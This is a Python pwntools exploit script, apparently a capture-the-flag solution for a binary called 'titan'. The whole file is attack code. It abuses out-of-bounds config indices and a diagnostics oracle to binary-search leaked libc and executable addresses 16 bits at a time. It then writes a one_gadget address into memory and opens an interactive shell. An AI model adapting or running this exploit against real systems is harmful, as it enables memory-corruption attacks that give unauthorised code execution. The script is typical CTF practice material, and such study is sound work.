#!/usr/bin/env python3

from asyncio import log
from pwn import *

exe = ELF("./titan")
libc = ELF("./libc-2.31.so")
#ld = ELF("./ld-2.31.so")

context.binary = exe

b =  "b * run_diagnostics+0x0398 b *update_config+0x0310"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="""
                        c
                       """)
    else:
        r = remote("addr", 1337)

    return r

def to_signed16_arith(val):
    if isinstance(val, (bytes, bytearray)):
        val = int(val)
    return (val + 2**15) % 2**16 - 2**15

def to_unsigned16_arith(val):
    if isinstance(val, (bytes, bytearray)):
        val = int(val)
    return val & 0xFFFF

def update(r, target, target_val , name = b"NONE"):
    r.recvuntil(b": ")
    r.sendline(b"2")
    r.sendline(target)
    r.recvuntil(b"upper boundry")
    if target != b"0":
        r.sendline(str(target_val).encode())
    r.recvuntil(b"Update titan serial number?")
    
    if name == b"NONE":
        r.sendline(b"n")
    else:
        r.sendline(b"y")
        r.sendline(name)
        

def run_diagnostics(r, val):
    r.sendline(b"3")
    r.recvuntil(b"(0-2): ")
    r.sendline(val)

def binary_search_16bit(r, current_addr, low=-32768, high=32767):
    while low <= high:
        mid = (low + high) // 2
        update(r, b"1", mid)
        update(r, b"2", mid)
        run_diagnostics(r, current_addr)
        diagnostics = r.recvuntil(b"Diagnose core temperature\n")

        diagnostics = r.recvline()
    
        if b"Systems OK!" in diagnostics:
            print(f"Found value: {mid} (0x{mid:04x})")
            return to_unsigned16_arith(mid)

        if b"High" in diagnostics:
            low = mid + 1
            continue

        if b"Low" in diagnostics:
            high = mid - 1
            continue



def main():
    r = conn()


    num = 245
    numarr = [0,0,0,0]
    numarr[0] = binary_search_16bit(r, b"245")
    print(hex(numarr[0]))
    numarr[1] = binary_search_16bit(r, b"246")
    print(hex(numarr[1]))
    numarr[2] = binary_search_16bit(r, b"247")
    print(hex(numarr[2]))
    numarr[3] = binary_search_16bit(r, b"248")
    print(hex(numarr[3]))
    leak = numarr[3]<<48 | numarr[2]<<32 | numarr[1]<<16 | numarr[0]
                
    offset = 0x742fd3a29e40 - 0x0000742fd3a00000
    libc.address = leak - offset
    one_gadget = libc.address + 0xe3afe
    libc_malloc_hook = libc.symbols['__malloc_hook']
    log.success(f"Leaked libc address: {hex(leak)}")
    log.success(f"Libc base address: {hex(libc.address)}")
    log.success(f"One gadget address: {hex(one_gadget)}")
    log.success(f"libc_malloc_hook address: {hex(libc_malloc_hook)}")

    numarr = [0,0,0,0]
    numarr[0] = binary_search_16bit(r, b"269")
    print(hex(numarr[0]))
    numarr[1] = binary_search_16bit(r, b"270")
    print(hex(numarr[1]))
    numarr[2] = binary_search_16bit(r, b"271")
    print(hex(numarr[2]))
    numarr[3] = binary_search_16bit(r, b"272")
    print(hex(numarr[3]))
    leak = numarr[3]<<48 | numarr[2]<<32 | numarr[1]<<16 | numarr[0]
    offset = 0x5a13e0c023c0 - 0x00005a13e0c00000
    exe.address = leak - offset
    log.success(f"Leaked exe address: {hex(leak)}")
    log.success(f"Exe base address: {hex(exe.address)}")
    titan_offset = 0x565b28519020 - 0x0000565b28512000
    titan_addr = exe.address + titan_offset
    log.success(f"Titan struct address: {hex(titan_addr)}")

    update(r, b"213", to_signed16_arith(one_gadget & 0xFFFF))
    update(r, b"214", to_signed16_arith((one_gadget >> 16) & 0xFFFF))
    update(r, b"215", to_signed16_arith((one_gadget >> 32) & 0xFFFF))
    update(r, b"216", to_signed16_arith((one_gadget >> 48) & 0xFFFF))
    r.interactive()


if __name__ == "__main__":
    main()
